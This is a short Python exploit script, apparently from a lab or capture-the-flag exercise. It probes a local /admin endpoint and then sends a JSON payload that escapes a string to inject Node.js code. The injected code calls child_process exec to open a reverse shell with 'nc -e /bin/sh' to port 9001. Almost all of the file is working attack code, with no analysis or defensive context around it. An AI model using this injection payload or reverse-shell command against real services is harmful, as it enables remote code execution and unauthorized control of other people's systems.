#!/usr/bin/python3

import requests
import urllib3
import logging
import sys
from time import sleep

logging.basicConfig(level=logging.INFO, format='%(asctime)s:%(levelname)s:%(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')

# 1. Establish Session
logging.info('1. Establishing Session')
sleep(2)
session = requests.Session()

# 2. Send a Test HTTP Request to /admin
response = requests.get('http://127.0.0.1:21440/admin')

if int(response.status_code) == 403:
    logging.info("2. Admin Page Live And Not Accessible...Yet\n")
    sleep(2)
else:
    logging.info("2. Admin Page Not Reachable...Printing status code received and exiting.\n")
    print(str(response.status_code) + "\n")
    sys.exit("...Exiting")

# 3. Send an HTTP POST Request to /admin with a test command.
payload = '{\"key\": \"\\");const { exec } = require(\\"child_process\\"); exec(\\"nc -e /bin/sh 127.0.0.1 9001\\");//\"}'
response = requests.post('http://127.0.0.1:21440/admin', data=payload)
logging.info("3. Sent POST exploit request.")